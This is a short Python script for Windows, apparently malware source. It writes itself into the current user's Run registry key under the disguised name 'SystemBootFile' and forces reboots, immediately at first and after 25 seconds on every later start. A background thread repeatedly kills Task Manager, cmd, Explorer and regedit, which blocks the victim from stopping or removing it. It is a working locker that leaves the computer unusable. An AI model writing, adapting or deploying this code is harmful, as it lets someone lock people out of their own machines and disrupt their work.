import time
import winreg
import os
import psutil
import threading
import sys



class Dispatcher:
    def __init__(self, program_name: str) -> None:
        self.program_name = program_name
        
    
    def add_to_startup(self) -> None:
        registry_path = winreg.HKEY_CURRENT_USER
        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            
        try:
            with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_WRITE) as registry_key:
                winreg.SetValueEx(registry_key, self.program_name, 0, winreg.REG_SZ, os.path.dirname(sys.executable) + r'\file.exe')
            self.reboot(time=False)
            
        except PermissionError:
            print("Нужны админские права.")
            os.system('pause')
            
            
            
    def check_startup_entry(self) -> bool:
        registry_path = winreg.HKEY_CURRENT_USER
        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        
        try:
            # Открываем ключ реестра для чтения
            with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_READ) as registry_key:
                _, _ = winreg.QueryValueEx(registry_key, self.program_name)
            return True
            
        except FileNotFoundError:
            return False
        
        
    def reboot(self, time: bool) -> None:
        if time is True:
            os.system('shutdown -r -t 25')
            
        else:
            os.system('shutdown -r -t 00')
        
        
        
def kill_task_manager() -> None:
    processes = ['cmd.exe', 'Taskmgr.exe', 'explorer.exe', 'regedit.exe']
    
    while True:
        time.sleep(1.2)
        
        all_process = psutil.process_iter()
        for process in all_process:
            if process.name() in processes:
                process.kill()    
    

def main() -> None:
    name = 'SystemBootFile'
    
    computer = Dispatcher(name)
    threading.Thread(target=kill_task_manager).start()
    
    if computer.check_startup_entry() is True:
        computer.reboot(time=True)
        
    else:
        computer.add_to_startup()
    


if __name__ == '__main__':
    main()
        
    
    